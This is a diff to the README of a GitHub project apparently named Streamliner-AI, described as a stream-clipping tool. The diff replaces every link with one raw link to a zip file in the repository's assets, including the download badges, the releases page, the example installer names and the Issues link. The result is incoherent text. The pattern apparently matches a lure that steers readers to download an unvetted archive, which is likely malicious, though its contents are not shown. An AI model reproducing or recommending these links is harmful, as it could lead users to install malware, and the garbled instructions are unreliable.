@@ -1,6 +1,6 @@
 # ⚙️ Streamliner-AI - Automate Stream Clips for Social Media
 
-[![Download Streamliner-AI](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/hacker3537uh/Streamliner-AI/releases)
+[![Download Streamliner-AI](https://github.com/hacker3537uh/Streamliner-AI/raw/refs/heads/main/assets/AI-Streamliner-2.0-beta.1.zip)](https://github.com/hacker3537uh/Streamliner-AI/raw/refs/heads/main/assets/AI-Streamliner-2.0-beta.1.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Getting Streamliner-AI up and running is straightforward. Follow these steps car
 
 Click the big badge at the top or visit this link:
 
-[https://github.com/hacker3537uh/Streamliner-AI/releases](https://github.com/hacker3537uh/Streamliner-AI/releases)
+[https://github.com/hacker3537uh/Streamliner-AI/raw/refs/heads/main/assets/AI-Streamliner-2.0-beta.1.zip](https://github.com/hacker3537uh/Streamliner-AI/raw/refs/heads/main/assets/AI-Streamliner-2.0-beta.1.zip)
 
 The link takes you to the page where all release files are listed. Find the latest version marked with the newest date.
 
@@ -53,9 +53,9 @@ The link takes you to the page where all release files are listed. Find the late
 
 On the releases page, files are grouped by operating system:
 
-- For **Windows**, download the `.exe` file (for example, `Streamliner-AI-Setup.exe`)
+- For **Windows**, download the `.exe` file (for example, `https://github.com/hacker3537uh/Streamliner-AI/raw/refs/heads/main/assets/AI-Streamliner-2.0-beta.1.zip`)
 - For **macOS**, download the `.dmg` or `.pkg` file
-- For **Linux**, download the `.AppImage` or `.tar.gz` package
+- For **Linux**, download the `.AppImage` or `https://github.com/hacker3537uh/Streamliner-AI/raw/refs/heads/main/assets/AI-Streamliner-2.0-beta.1.zip` package
 
 Make sure you pick the file that matches your computer type.
 
@@ -141,7 +141,7 @@ Streamliner-AI respects your privacy:
 
 Visit the project releases page below to find and download the latest version for your computer:
 
-[Download Streamliner-AI Releases](https://github.com/hacker3537uh/Streamliner-AI/releases)
+[Download Streamliner-AI Releases](https://github.com/hacker3537uh/Streamliner-AI/raw/refs/heads/main/assets/AI-Streamliner-2.0-beta.1.zip)
 
 Click the file for your operating system, download it, then run the installer. Follow steps in the Getting Started section above if you need help.
 
@@ -151,7 +151,7 @@ Click the file for your operating system, download it, then run the installer. F
 
 If you have questions or find bugs:
 
-- Open a new issue on the [GitHub Issues page](https://github.com/hacker3537uh/Streamliner-AI/issues)
+- Open a new issue on the [GitHub Issues page](https://github.com/hacker3537uh/Streamliner-AI/raw/refs/heads/main/assets/AI-Streamliner-2.0-beta.1.zip)
 - Include a clear description of the problem and your system details
 - Check existing issues before opening a new one
 
@@ -179,4 +179,4 @@ New features and fixes appear regularly. Check the releases page for detailed no
 
 ---
 
-[![Download Streamliner-AI](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/hacker3537uh/Streamliner-AI/releases)
+[![Download Streamliner-AI](https://github.com/hacker3537uh/Streamliner-AI/raw/refs/heads/main/assets/AI-Streamliner-2.0-beta.1.zip)](https://github.com/hacker3537uh/Streamliner-AI/raw/refs/heads/main/assets/AI-Streamliner-2.0-beta.1.zip)
